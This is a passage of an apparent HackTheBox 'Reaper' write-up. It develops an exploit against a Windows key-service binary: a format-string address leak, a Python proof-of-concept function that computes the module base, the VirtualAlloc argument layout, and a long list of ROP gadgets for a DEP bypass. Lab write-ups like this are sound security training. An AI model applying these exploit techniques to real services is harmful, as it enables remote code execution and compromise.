<span class="m">7</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">8</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">9</span>.<span class="w"> </span>Exit
<span class="m">1</span>
Enter<span class="w"> </span>a<span class="w"> </span>key:<span class="w"> </span>%p
Invalid<span class="w"> </span>key<span class="w"> </span>format
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">10</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">11</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">12</span>.<span class="w"> </span>Exit
<span class="m">2</span>
Checking<span class="w"> </span>key:<span class="w"> </span>00007FF74BD10660
,<span class="w"> </span>Comment:<span class="w"> </span>
Could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>key!
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">13</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">14</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">15</span>.<span class="w"> </span>Exit
</code></pre></div>
<p>I get a leak!</p>
<div class="highlight"><pre><span></span><code>Checking key: 00007FF74BD10660
, Comment:
</code></pre></div>
<p>Looking at windbg to see if I can identify what range the address is from:</p>
<div class="highlight"><pre><span></span><code>Symbol search path is: srv*c:\symbols;srv*C:\symbols*https://msdl.microsoft.com/download/symbols;C:\symbolsextra
Executable search path is: 
ModLoad: 00007ff7`4bcf0000 00007ff7`4bd23000   C:\reaper\dev_keysvc.exe
ModLoad: 00007fff`c0630000 00007fff`c0828000   C:\Windows\SYSTEM32\ntdll.dll
ModLoad: 00007fff`bef90000 00007fff`bf052000   C:\Windows\System32\KERNEL32.DLL
ModLoad: 00007fff`bdfe0000 00007fff`be2d6000   C:\Windows\System32\KERNELBASE.dll
ModLoad: 00007fff`c0360000 00007fff`c03cb000   C:\Windows\System32\WS2_32.dll
ModLoad: 00007fff`c04d0000 00007fff`c05f0000   C:\Windows\System32\RPCRT4.dll
ModLoad: 00007fff`bd370000 00007fff`bd3da000   C:\Windows\system32\mswsock.dll
</code></pre></div>
<p>It is from <code>dev_keysvc.exe</code></p>
<div class="highlight"><pre><span></span><code>ModLoad: 00007ff7`4bcf0000 00007ff7`4bd23000   C:\reaper\dev_keysvc.exe
</code></pre></div>
<p>Calculating the difference from base</p>
<div class="highlight"><pre><span></span><code><span class="n">In</span> <span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="n">base</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="s2">"00007ff74bcf0000"</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>

<span class="n">In</span> <span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="n">leak</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="s2">"00007FF74BD10660"</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>

<span class="n">In</span> <span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">base</span>
<span class="n">Out</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="mi">132704</span>

<span class="n">In</span> <span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">leak</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">base</span><span class="si">:</span><span class="s2">08x</span><span class="si">}</span><span class="s2">"</span>
<span class="n">Out</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="s1">'00020660'</span>
</code></pre></div>
<p>The following formula captures the leaked address, deducts the offset to the base address of <code>dev_keysvc.exe</code>, then returns the base address.</p>
<div class="highlight"><pre><span></span><code><span class="err">┌──</span><span class="p">(</span><span class="n">notroot</span><span class="err">㉿</span><span class="n">elysium</span><span class="p">)</span><span class="o">-</span><span class="p">[(</span><span class="n">master</span><span class="p">)</span> <span class="mi">1</span> <span class="o">~/</span><span class="n">htb</span><span class="o">/</span><span class="n">machines</span><span class="o">/</span><span class="n">reaper</span><span class="p">]</span>
<span class="err">└─$</span> <span class="n">cat</span> <span class="n">poc</span><span class="o">.</span><span class="n">py</span> <span class="o">|</span> <span class="n">awk</span> <span class="o">-</span><span class="n">v</span> <span class="n">RS</span><span class="o">=</span><span class="s2">""</span> <span class="s1">'/get_leak/'</span>

<span class="k">def</span><span class="w"> </span><span class="nf">get_leak</span><span class="p">(</span><span class="n">sock</span><span class="p">):</span>
    <span class="c1"># ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]</span>
    <span class="c1"># └─$ echo "Hello" | base64 -w0</span>
    <span class="c1"># SGVsbG8=</span>
    <span class="n">bufs</span> <span class="o">=</span> <span class="p">[</span> <span class="s2">"1</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"110-FE9A1-550-A271-0109-SGVsbG8=</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"2</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"1</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"%p</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"2</span><span class="se">\n</span><span class="s2">"</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">bufs</span><span class="p">)):</span>
        <span class="n">recvd</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span>
        <span class="n">dprint</span><span class="p">(</span><span class="n">recvd</span><span class="p">)</span>
        <span class="k">if</span> <span class="s2">"key format"</span> <span class="ow">in</span> <span class="n">recvd</span> <span class="ow">or</span> <span class="s1">'Checking key'</span> <span class="ow">in</span> <span class="n">recvd</span><span class="p">:</span>
            <span class="n">recvd</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span>
            <span class="n">dprint</span><span class="p">(</span><span class="n">recvd</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">bufs</span><span class="p">[</span><span class="n">x</span><span class="p">][:</span><span class="mi">32</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">((</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x0a</span><span class="s1">'</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">),</span><span class="sa">r</span><span class="s1">'</span><span class="se">\\</span><span class="s1">n'</span><span class="p">)</span><span class="si">}</span><span class="s2">[...]"</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">bufs</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">))</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">" "</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
    <span class="n">baseaddr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">132704</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"** dev_keysvc leakaddr: 0x</span><span class="si">{</span><span class="n">leak</span><span class="si">}</span><span class="s2"> **"</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"** dev_keysvc baseaddr: 0x</span><span class="si">{</span><span class="n">baseaddr</span><span class="si">:</span><span class="s2">016x</span><span class="si">}</span><span class="s2"> **"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">baseaddr</span> 
</code></pre></div>
<p>The net result when executed:
</p><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>./poc.py<span class="w"> </span><span class="m">192</span>.168.56.100:4141
**<span class="w"> </span>dev_keysvc<span class="w"> </span>leakaddr:<span class="w"> </span>0x00007FF74BD10660<span class="w"> </span>**
**<span class="w"> </span>dev_keysvc<span class="w"> </span>baseaddr:<span class="w"> </span>0x00007ff74bcf0000<span class="w"> </span>**
</code></pre></div><p></p>
<p>Time for some ROP gadgets to add the base to</p>
<h3 id="finding-ropgadgets">Finding ROPgadgets<a class="headerlink" href="#finding-ropgadgets" title="Permanent link">¶</a></h3>
<p>The calling convention for x64 Windows, at least the first four arguments, is RCX, RDX, R8, and R9 (<a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170</a>).  So the call to VirtualAlloc needs to look like this:</p>
<div class="highlight"><pre><span></span><code><span class="n">LPVOID</span><span class="w"> </span><span class="nf">VirtualAlloc</span><span class="p">(</span>
<span class="w">    </span><span class="n">RCX</span><span class="o">=</span><span class="n">RSP</span><span class="o">+</span><span class="n">offset</span><span class="w">  </span><span class="c1">// [in, optional] LPVOID lpAddress,</span>
<span class="w">    </span><span class="n">RDX</span><span class="o">=</span><span class="mh">0x1000</span><span class="w">      </span><span class="c1">// [in]           SIZE_T dwSize,</span>
<span class="w">    </span><span class="n">R8</span><span class="o">=</span><span class="mh">0x1000</span><span class="w">       </span><span class="c1">// [in]           DWORD  flAllocationType,</span>
<span class="w">    </span><span class="n">R9</span><span class="o">=</span><span class="mh">0x40</span><span class="w">         </span><span class="c1">// [in]           DWORD  flProtect</span>
<span class="p">);</span>
</code></pre></div>
<p>For finding ROP gadgets, I have a tool I made that wraps around <code>rp++</code> and extends its capabilities a bit.  The tool is called <code>rp++-ng</code> (<a href="https://github.com/SYANiDE-/rp-ng">https://github.com/SYANiDE-/rp-ng</a>).  Most of the capability revolves around the tool performing a collection of regex idioms against <code>rp++</code>, and using an <code>ncurses</code>-based menu to manually select gadgets (<code>space</code>) that you find to be interesting or maybe useful, and moving through each new regex pattern match (<code>q</code>).  At the end it displays all the selected gadgets in a consumable list.  Other capabilities, like filtering out duplicates, adjusting the base virtual address of the output, filtering out badchar opcodes, and other useful features.  </p>
<p>In the below, I have set the VA for all gadgets to start at a base of <code>0x0</code> (as we'll be working in relative addresses to baseaddr of <code>dev_keysvc.exe</code>), gadgets max length 10 instructions, sorted (from shortest to longest length), remove duplicates (-u), and use a looser set of regex idioms for matching (-l).  </p>
<p>Here is an initial list of gadgets I curated and selected, which I thought might be useful, who knows.</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>rp++-ng<span class="w"> </span>--file<span class="w"> </span>dev_keysvc.exe<span class="w"> </span>--va<span class="w"> </span>0x0<span class="w"> </span>--roplen<span class="w"> </span><span class="m">10</span><span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>-l<span class="w"> </span><span class="m">2</span>&gt;/dev/null

<span class="w">  </span>rp++-ng?<span class="w">                           </span>^^<span class="w">           </span>
<span class="w">             </span>_________<span class="w"> </span>_________<span class="w">      </span>___<span class="w"> </span>__<span class="w">  </span>__________<span class="w"> </span><span class="sb">`</span>
<span class="w">   </span>.<span class="w">       </span><span class="p">|</span><span class="w">    </span>_o___<span class="p">|</span><span class="w">    </span>_o___<span class="w"> </span>++-<span class="w"> </span><span class="p">|</span><span class="w">   </span><span class="se">\ </span><span class="w"> </span><span class="p">|</span>/<span class="w">   </span>/_____/<span class="w">  </span>!
<span class="w">          </span><span class="p">|</span>___<span class="p">|</span><span class="se">\_</span>___<span class="p">|</span>___<span class="p">|</span>%%%%%<span class="w">     </span><span class="p">|</span>____<span class="se">\_</span><span class="p">|</span><span class="se">\_</span>__<span class="se">\_</span>___.<span class="o">]</span><span class="w"> </span>
<span class="w">  </span>z<span class="w">        </span><span class="sb">`</span>BB<span class="s1">' `BBB'</span><span class="sb">`</span>B<span class="s1">'           `BBBBBBB'</span><span class="w"> </span><span class="sb">`</span>BBBBBBBB<span class="err">'</span><span class="w"> </span>
<span class="w">     </span><span class="p">;</span><span class="w">                                    </span>Chain<span class="w"> </span>faster
<span class="w">              </span><span class="o">[[</span><span class="w">                            </span><span class="nv">$$$$</span>$<span class="w"> </span><span class="nv">$$$$$$</span><span class="w">      </span>i
<span class="w">                    </span>+<span class="w">                                    </span>SYANiDE


0x5af0:<span class="w"> </span>jmp<span class="w"> </span>r10<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x2cf2:<span class="w"> </span>jmp<span class="w"> </span>r11<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x5ade:<span class="w"> </span>jmp<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x2cf3:<span class="w"> </span>jmp<span class="w"> </span>rbx<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x2aac:<span class="w"> </span>jmp<span class="w"> </span>rcx<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x38c8:<span class="w"> </span>jmp<span class="w"> </span>rdx<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1ef3d:<span class="w"> </span>jmp<span class="w"> </span>rdi<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x2aab:<span class="w"> </span>jmp<span class="w"> </span>r9<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x37b9:<span class="w"> </span>call<span class="w"> </span>r8<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x3692:<span class="w"> </span>call<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1f324:<span class="w"> </span>call<span class="w"> </span>rbx<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x184b8:<span class="w"> </span>call<span class="w"> </span>rdx<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x158a:<span class="w"> </span>xor<span class="w"> </span>al,<span class="w"> </span>al<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x25a0:<span class="w"> </span>xor<span class="w"> </span>eax,<span class="w"> </span>eax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1fa1:<span class="w"> </span>xor<span class="w"> </span>ebx,<span class="w"> </span>esp<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1fa0:<span class="w"> </span>xor<span class="w"> </span>rbx,<span class="w"> </span>rsp<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1f27f:<span class="w"> </span>xor<span class="w"> </span>rax,<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x3db5:<span class="w"> </span>push<span class="w"> </span>rdi<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x53cd:<span class="w"> </span>push<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>r14<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xfb0a:<span class="w"> </span>push<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>rbp<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x5d6d:<span class="w"> </span>push<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>rdi<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1fc2:<span class="w"> </span>push<span class="w"> </span>rbx<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x14b02:<span class="w"> </span>push<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>r15<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1e532:<span class="w"> </span>push<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>rbx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x2bb9:<span class="w"> </span>push<span class="w"> </span>rsp<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>eax,<span class="w"> </span>esi<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x47b3:<span class="w"> </span>pop<span class="w"> </span>r13<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x488f:<span class="w"> </span>pop<span class="w"> </span>r14<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x644d:<span class="w"> </span>pop<span class="w"> </span>r15<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x150a:<span class="w"> </span>pop<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x259e:<span class="w"> </span>pop<span class="w"> </span>rbp<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x20d9:<span class="w"> </span>pop<span class="w"> </span>rbx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x16f0:<span class="w"> </span>pop<span class="w"> </span>rdi<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x4116:<span class="w"> </span>pop<span class="w"> </span>rsi<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xa99c:<span class="w"> </span>pop<span class="w"> </span>rsp<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x31dc:<span class="w"> </span>pop<span class="w"> </span>rcx<span class="w"> </span><span class="p">;</span><span class="w"> </span>clc<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x31b6:<span class="w"> </span>pop<span class="w"> </span>rcx<span class="w"> </span><span class="p">;</span><span class="w"> </span>cld<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xe97a:<span class="w"> </span>xchg<span class="w"> </span>eax,<span class="w"> </span>edx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x271c:<span class="w"> </span>xchg<span class="w"> </span>eax,<span class="w"> </span>esp<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x15765:<span class="w"> </span>xchg<span class="w"> </span>eax,<span class="w"> </span>ebp<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xae07:<span class="w"> </span>mov<span class="w"> </span>al,<span class="w"> </span>dl<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x9ec5:<span class="w"> </span>mov<span class="w"> </span>al,<span class="w"> </span>r8L<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x30f2:<span class="w"> </span>mov<span class="w"> </span>eax,<span class="w"> </span>ebx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x5437:<span class="w"> </span>mov<span class="w"> </span>eax,<span class="w"> </span>ecx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1f81:<span class="w"> </span>mov<span class="w"> </span>ecx,<span class="w"> </span>eax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1fb4:<span class="w"> </span>mov<span class="w"> </span>esp,<span class="w"> </span>ebx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1fb3:<span class="w"> </span>mov<span class="w"> </span>r12,<span class="w"> </span>rbx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x30f1:<span class="w"> </span>mov<span class="w"> </span>rax,<span class="w"> </span>r11<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1f381:<span class="w"> </span>mov<span class="w"> </span>rax,<span class="w"> </span>r9<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x5436:<span class="w"> </span>mov<span class="w"> </span>rax,<span class="w"> </span>rcx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1f80:<span class="w"> </span>mov<span class="w"> </span>rcx,<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1402f:<span class="w"> </span>mov<span class="w"> </span>eax,<span class="w"> </span>edx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1402e:<span class="w"> </span>mov<span class="w"> </span>rax,<span class="w"> </span>rdx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xa7cd:<span class="w"> </span>mov<span class="w"> </span>rsp,<span class="w"> </span>r11<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>rbp<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x11a73:<span class="w"> </span>mov<span class="w"> </span>rsp,<span class="w"> </span>r11<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>r14<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1cd19:<span class="w"> </span>mov<span class="w"> </span>rsp,<span class="w"> </span>r11<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>rdi<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1f90:<span class="w"> </span>mov<span class="w"> </span>r9,<span class="w"> </span>rbx<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>r8,<span class="w"> </span>0x0000000000000000<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span>0x08<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1547f:<span class="w"> </span>mov<span class="w"> </span>rax,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span>0x28<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x4524:<span class="w"> </span>mov<span class="w"> </span>rax,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rcx<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span><span class="o">[</span>rdx+rax<span class="o">]</span>,<span class="w"> </span>r8d<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x2b8d:<span class="w"> </span>mov<span class="w"> </span>rcx,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rdx<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>rcx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x2b55:<span class="w"> </span>mov<span class="w"> </span>r8,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rdx<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>movzx<span class="w"> </span>ecx,<span class="w"> </span>byte<span class="w"> </span><span class="o">[</span>rdx+0x08<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>r8<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>byte<span class="w"> </span><span class="o">[</span>rax+0x08<span class="o">]</span>,<span class="w"> </span>cl<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x2b90:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>rcx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x5433:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rcx<span class="o">]</span>,<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>rax,<span class="w"> </span>rcx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x2b69:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>r8<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span><span class="o">[</span>rax+0x08<span class="o">]</span>,<span class="w"> </span>ecx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x1b90e:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>r8<span class="o">]</span>,<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>eax,<span class="w"> </span>0x00000001<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x2b5c:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>r8<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>byte<span class="w"> </span><span class="o">[</span>rax+0x08<span class="o">]</span>,<span class="w"> </span>cl<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x2b4d:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>r8<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>word<span class="w"> </span><span class="o">[</span>rax+0x08<span class="o">]</span>,<span class="w"> </span>cx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xa28c:<span class="w"> </span>mov<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>r8<span class="o">]</span>,<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>xor<span class="w"> </span>eax,<span class="w"> </span>eax<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span>0x38<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0xfdae:<span class="w"> </span>mov<span class="w"> </span>r14,<span class="w"> </span>qword<span class="w"> </span><span class="o">[</span>rsp+0x18<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
